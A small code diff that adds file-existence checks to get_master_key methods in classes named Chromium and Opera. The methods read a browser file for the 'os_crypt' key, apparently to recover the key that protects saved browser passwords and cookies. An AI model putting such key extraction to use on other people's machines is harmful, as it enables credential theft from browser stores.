@@ -149,6 +149,9 @@ class Chromium:
                         pass
 
     def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path):
+            return
+
         if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
             return
 
@@ -294,6 +297,9 @@ class Opera:
                     pass
 
     def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path):
+            return
+
         if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
             return
 
